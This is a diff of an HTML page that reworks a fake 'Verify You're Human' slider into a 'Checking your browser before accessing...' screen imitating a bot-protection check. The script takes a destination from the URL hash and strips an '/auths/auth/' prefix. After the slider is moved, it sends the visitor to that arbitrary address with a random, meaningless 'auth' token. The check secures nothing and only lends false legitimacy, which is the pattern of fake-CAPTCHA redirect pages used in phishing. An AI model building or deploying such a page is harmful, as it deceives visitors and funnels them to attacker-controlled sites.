@@ -3,56 +3,77 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Human Verification</title>
+<title>Checking your browser...</title>
+
 <style>
-body { font-family: sans-serif; text-align: center; margin-top: 50px; background:#f0f2f5;}
-h2 { color:#333; }
-.slider-container { margin: 30px auto; width: 300px; }
-input[type=range] { width: 100%; }
-button { padding:10px 20px; font-size:16px; cursor:pointer; margin-top:20px; }
-.success { color:green; font-weight:bold; margin-top:20px; display:none; }
+body{
+  font-family:sans-serif;
+  background:#f6f7f9;
+  text-align:center;
+  margin-top:80px;
+}
+.box{
+  background:white;
+  padding:30px;
+  border-radius:10px;
+  display:inline-block;
+  box-shadow:0 0 15px rgba(0,0,0,0.1);
+}
 </style>
 </head>
 <body>
 
-<h2>Verify You're Human</h2>
-<p>Slide to verify:</p>
+<div class="box">
+<h2>Checking your browser before accessing...</h2>
+<p id="status">Slide to verify you are human.</p>
 
-<div class="slider-container">
-  <input type="range" min="0" max="100" value="0" id="slider">
+<input type="range" id="slider" min="0" max="100" value="0">
+<br><br>
+<button onclick="verify()">Verify</button>
 </div>
-<button onclick="checkSlider()">Verify</button>
-
-<p class="success" id="successMsg">Verification Successful! Redirecting...</p>
 
 <script>
-// Get redirect URL from query
-function getRedirectURL() {
-    const params = new URLSearchParams(window.location.search);
-    return params.get('redirect') || 'https://example.com';
+// Extract redirect from URL
+function getRedirect() {
+  let hash = window.location.hash.substring(1);
+  if(!hash) return null;
+
+  // remove /auths/auth/
+  hash = hash.replace("/auths/auth/","");
+  return decodeURIComponent(hash);
 }
 
-// Generate fake token
-function generateToken(length = 10) {
-    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    let token = "";
-    for(let i=0;i<length;i++) token += chars[Math.floor(Math.random()*chars.length)];
-    return token;
+function generateToken(len=12){
+  const chars="abcdefghijklmnopqrstuvwxyz0123456789";
+  let t="";
+  for(let i=0;i<len;i++)
+    t+=chars[Math.floor(Math.random()*chars.length)];
+  return t;
 }
 
-// Check slider
-function checkSlider() {
-    const slider = document.getElementById('slider');
-    if(slider.value >= 95){ // human passed
-        const token = generateToken();
-        const redirectURL = getRedirectURL();
-        document.getElementById('successMsg').style.display = 'block';
-        setTimeout(()=>{
-            window.location.href = `${redirectURL}?auth=${token}`;
-        }, 1000);
-    } else {
-        alert('Please slide to the end to verify!');
-    }
+function verify(){
+  const slider=document.getElementById("slider");
+
+  if(slider.value < 95){
+    alert("Please slide fully to verify.");
+    return;
+  }
+
+  const redirect=getRedirect();
+
+  if(!redirect){
+    document.getElementById("status").innerText="No redirect URL.";
+    return;
+  }
+
+  document.getElementById("status").innerText="Verification successful. Redirecting...";
+
+  const token=generateToken();
+
+  setTimeout(()=>{
+    window.location.href =
+      redirect + "?auth=" + token;
+  },1200);
 }
 </script>
 
